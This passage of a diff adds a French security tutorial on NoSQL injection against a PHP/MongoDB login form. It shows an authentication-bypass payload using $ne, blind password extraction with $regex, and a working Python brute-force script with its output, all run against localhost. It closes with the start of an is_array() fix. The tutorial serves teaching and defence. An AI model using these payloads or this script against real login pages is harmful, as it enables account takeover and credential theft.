+&lt;span class="s1"&gt;     &amp;lt;input type=&amp;quot;password&amp;quot; id=&amp;quot;usr_password&amp;quot; name=&amp;quot;usr_password&amp;quot; /&amp;gt;&lt;/span&gt;
+&lt;span class="s1"&gt;     &amp;lt;input  name=&amp;quot;submitForm&amp;quot; id=&amp;quot;submitForm&amp;quot; type=&amp;quot;submit&amp;quot; value=&amp;quot;Login&amp;quot; /&amp;gt;&lt;/span&gt;
+&lt;span class="s1"&gt;     &amp;lt;/form&amp;gt;&lt;/span&gt;
+&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On ajoute un utilisateur dans la base de données:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ mongo
+MongoDB shell version: &lt;span class="m"&gt;2&lt;/span&gt;.6.7
+connecting to: &lt;span class="nb"&gt;test&lt;/span&gt;
+Server has startup warnings:
+&lt;span class="m"&gt;2015&lt;/span&gt;-02-22T00:57:09.519+0100 ** WARNING: --rest is specified without --httpinter face,
+&lt;span class="m"&gt;2015&lt;/span&gt;-02-22T00:57:09.521+0100 ** enabling http interface
+&amp;gt; db.people.insert&lt;span class="o"&gt;({&lt;/span&gt;user:&lt;span class="s2"&gt;&amp;quot;Geluchat&amp;quot;&lt;/span&gt;,password:&lt;span class="s2"&gt;&amp;quot;mdp&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+WriteResult&lt;span class="o"&gt;({&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;nInserted&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;})&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Tout est prêt, nous allons pouvoir procéder à notre première injection NOSQL.&lt;/p&gt;
+&lt;p&gt;On passe usr_name[$ne]=h4cker&amp;amp;usr_password[$ne]=h4xor grace à HackBar:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Hackbar nosql" src="https://www.dailysecurity.fr/images/4QcrMsM.png"&gt;&lt;/p&gt;
+&lt;p&gt;Nous voici désormais Administrateur.&lt;/p&gt;
+&lt;p&gt;Maintenant, vous vous demandez: "Comment ça marche?".&lt;/p&gt;
+&lt;p&gt;Selon la documentation &lt;a href="http://docs.mongodb.org/manual/reference/operator/query/"&gt;MongoDB sur les opérateurs de requête&lt;/a&gt;  $ne correspond à "Différent de".&lt;/p&gt;
+&lt;p&gt;Lorsque PHP crée la requête il utilise la fonction array(), qui nous permet de faire des array à partir d'array déjà existants.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;$qry&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+     &lt;span class="s2"&gt;&amp;quot;user&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;$usr_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+     &lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;$usr_password&lt;/span&gt;
+&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// Construction de la requête NOSQL&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Pour mieux comprendre, on fait un var_dump($qry), on obtient:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;array&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;
+    &lt;span class="k"&gt;array&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+      &lt;span class="s1"&gt;&amp;#39;$ne&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;string&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;h4cker&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="s1"&gt;&amp;#39;password&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;
+    &lt;span class="k"&gt;array&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+      &lt;span class="s1"&gt;&amp;#39;$ne&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;string&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;h4xor&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Ce qui traduit en "Pseudo SQL" donne: "WHERE user!=h4cker and password!=h4xor".&lt;/p&gt;
+&lt;p&gt;On a donc vu un exemple d'exploitation classique.&lt;/p&gt;
+&lt;p&gt;Mais nous, ce qu'on veut, c'est récupérer le mot de passe administrateur.&lt;/p&gt;
+&lt;p&gt;Malheureusement, nous ne disposons d'aucun affichage, il va donc falloir trouver un autre moyen d'accéder à ce mot de passe.&lt;/p&gt;
+&lt;p&gt;Toujours dans la documentation &lt;a href="http://docs.mongodb.org/manual/reference/operator/query/"&gt;MongoDB&lt;/a&gt; on trouve $regex.&lt;/p&gt;
+&lt;p&gt;Les fameuses regex vont donc pouvoir nous sauver, l'exploitation se fera en blind.&lt;/p&gt;
+&lt;p&gt;Pour ceux qui ne comprennent rien au regex, ne vous inquiétez pas, je vais vous expliquer la construction de la requête:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;. : Représente n’importe quelle caractère&lt;/li&gt;
+&lt;li&gt;caractère {un nombre} (ex: .{5}): Caractère fois le nombre&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Donc pour trouver la taille on cherche avec:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;usr_name&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$ne&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nx"&gt;h4cker&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;usr_password&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$regex&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=.&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On incrémente de 1 à chaque fois, jusqu'à ce que "Bienvenue Administrateur" disparaisse.&lt;/p&gt;
+&lt;p&gt;Et on trouve:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;usr_name&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$ne&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nx"&gt;h4cker&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;usr_password&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$regex&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=.&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Le mot de passe (mdp) fait bien 3 caractères.&lt;/p&gt;
+&lt;p&gt;On procède de la même façon pour les caractères:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;usr_name&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$ne&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nx"&gt;h4cker&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;usr_password&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$regex&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nx"&gt;m&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="nx"&gt;usr_name&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$ne&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nx"&gt;h4cker&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;usr_password&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$regex&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nx"&gt;md&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="nx"&gt;usr_name&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$ne&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nx"&gt;h4cker&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;usr_password&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$regex&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nx"&gt;mdp&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;J'ai codé un petit script en python qui fait le travail à notre place et voilà le travail:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/usr/bin/env python2&lt;/span&gt;
+&lt;span class="c1"&gt;# -*- coding: utf8 -*-&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
+
+&lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://localhost/NOSQL/&amp;quot;&lt;/span&gt;
+
+&lt;span class="n"&gt;taille&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
+&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+     &lt;span class="n"&gt;forge&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.{&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;taille&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+     &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;usr_name[$ne]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hacker&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;usr_password[$regex]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;forge&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+     &lt;span class="n"&gt;resultat&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;
+     &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+     &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;resultat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Bienvenue&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;==-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;
+          &lt;span class="k"&gt;break&lt;/span&gt;
+     &lt;span class="n"&gt;taille&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
+
+&lt;span class="n"&gt;taille&lt;/span&gt;&lt;span class="o"&gt;-=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;[+] Le password fait &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;taille&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; caracteres&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;48&lt;/span&gt;
+
+&lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
+
+&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="n"&gt;taille&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+     &lt;span class="n"&gt;forge&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.{&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;taille&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;}&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+     &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;usr_name[$ne]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hacker&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;usr_password[$regex]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;forge&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+     &lt;span class="n"&gt;resultat&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;
+     &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+     &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;resultat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Bienvenue&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;!=-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;
+          &lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+          &lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;48&lt;/span&gt;
+          &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
+          &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+     &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;90&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+          &lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;96&lt;/span&gt;
+     &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;57&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+          &lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;
+     &lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
+
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;[+] Le password est: &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;$ &lt;/span&gt;python NOSQL.py
+&lt;span class="go"&gt;{&amp;#39;usr_password[$regex]&amp;#39;: &amp;#39;.{0}&amp;#39;, &amp;#39;usr_name[$ne]&amp;#39;: &amp;#39;hacker&amp;#39;}&lt;/span&gt;
+&lt;span class="go"&gt;{&amp;#39;usr_password[$regex]&amp;#39;: &amp;#39;.{1}&amp;#39;, &amp;#39;usr_name[$ne]&amp;#39;: &amp;#39;hacker&amp;#39;}&lt;/span&gt;
+&lt;span class="go"&gt;{&amp;#39;usr_password[$regex]&amp;#39;: &amp;#39;.{2}&amp;#39;, &amp;#39;usr_name[$ne]&amp;#39;: &amp;#39;hacker&amp;#39;}&lt;/span&gt;
+&lt;span class="go"&gt;{&amp;#39;usr_password[$regex]&amp;#39;: &amp;#39;.{3}&amp;#39;, &amp;#39;usr_name[$ne]&amp;#39;: &amp;#39;hacker&amp;#39;}&lt;/span&gt;
+&lt;span class="go"&gt;{&amp;#39;usr_password[$regex]&amp;#39;: &amp;#39;.{4}&amp;#39;, &amp;#39;usr_name[$ne]&amp;#39;: &amp;#39;hacker&amp;#39;}&lt;/span&gt;
+&lt;span class="go"&gt;[+] Le password fait 3 caracteres&lt;/span&gt;
+&lt;span class="go"&gt;{&amp;#39;usr_password[$regex]&amp;#39;: &amp;#39;0.{2}&amp;#39;, &amp;#39;usr_name[$ne]&amp;#39;: &amp;#39;hacker&amp;#39;}&lt;/span&gt;
+&lt;span class="go"&gt;...&lt;/span&gt;
+&lt;span class="go"&gt;{&amp;#39;usr_password[$regex]&amp;#39;: &amp;#39;L.{2}&amp;#39;, &amp;#39;usr_name[$ne]&amp;#39;: &amp;#39;hacker&amp;#39;}&lt;/span&gt;
+&lt;span class="go"&gt;{&amp;#39;usr_password[$regex]&amp;#39;: &amp;#39;M.{2}&amp;#39;, &amp;#39;usr_name[$ne]&amp;#39;: &amp;#39;hacker&amp;#39;}&lt;/span&gt;
+&lt;span class="go"&gt;{&amp;#39;usr_password[$regex]&amp;#39;: &amp;#39;N.{2}&amp;#39;, &amp;#39;usr_name[$ne]&amp;#39;: &amp;#39;hacker&amp;#39;}&lt;/span&gt;
+&lt;span class="go"&gt;{&amp;#39;usr_password[$regex]&amp;#39;: &amp;#39;O.{2}&amp;#39;, &amp;#39;usr_name[$ne]&amp;#39;: &amp;#39;hacker&amp;#39;}&lt;/span&gt;
+&lt;span class="go"&gt;...&lt;/span&gt;
+&lt;span class="go"&gt;{&amp;#39;usr_password[$regex]&amp;#39;: &amp;#39;k.{2}&amp;#39;, &amp;#39;usr_name[$ne]&amp;#39;: &amp;#39;hacker&amp;#39;}&lt;/span&gt;
+&lt;span class="go"&gt;{&amp;#39;usr_password[$regex]&amp;#39;: &amp;#39;l.{2}&amp;#39;, &amp;#39;usr_name[$ne]&amp;#39;: &amp;#39;hacker&amp;#39;}&lt;/span&gt;
+&lt;span class="go"&gt;{&amp;#39;usr_password[$regex]&amp;#39;: &amp;#39;m.{2}&amp;#39;, &amp;#39;usr_name[$ne]&amp;#39;: &amp;#39;hacker&amp;#39;}&lt;/span&gt;
+&lt;span class="go"&gt;m&lt;/span&gt;
+&lt;span class="go"&gt;{&amp;#39;usr_password[$regex]&amp;#39;: &amp;#39;m1.{1}&amp;#39;, &amp;#39;usr_name[$ne]&amp;#39;: &amp;#39;hacker&amp;#39;}&lt;/span&gt;
+&lt;span class="go"&gt;{&amp;#39;usr_password[$regex]&amp;#39;: &amp;#39;m2.{1}&amp;#39;, &amp;#39;usr_name[$ne]&amp;#39;: &amp;#39;hacker&amp;#39;}&lt;/span&gt;
+&lt;span class="go"&gt;...&lt;/span&gt;
+&lt;span class="go"&gt;{&amp;#39;usr_password[$regex]&amp;#39;: &amp;#39;md.{1}&amp;#39;, &amp;#39;usr_name[$ne]&amp;#39;: &amp;#39;hacker&amp;#39;}&lt;/span&gt;
+&lt;span class="go"&gt;md&lt;/span&gt;
+&lt;span class="go"&gt;{&amp;#39;usr_password[$regex]&amp;#39;: &amp;#39;md1.{0}&amp;#39;, &amp;#39;usr_name[$ne]&amp;#39;: &amp;#39;hacker&amp;#39;}&lt;/span&gt;
+&lt;span class="go"&gt;{&amp;#39;usr_password[$regex]&amp;#39;: &amp;#39;md2.{0}&amp;#39;, &amp;#39;usr_name[$ne]&amp;#39;: &amp;#39;hacker&amp;#39;}&lt;/span&gt;
+&lt;span class="go"&gt;...&lt;/span&gt;
+&lt;span class="go"&gt;{&amp;#39;usr_password[$regex]&amp;#39;: &amp;#39;mdp.{0}&amp;#39;, &amp;#39;usr_name[$ne]&amp;#39;: &amp;#39;hacker&amp;#39;}&lt;/span&gt;
+&lt;span class="go"&gt;mdp&lt;/span&gt;
+&lt;span class="go"&gt;[+] Le password est: mdp&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Pour patcher cette faille, une solution : la vérification grâce à la fonction is_array():&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;usr_name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;usr_password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;is_array&lt;/span&gt;&lt;span 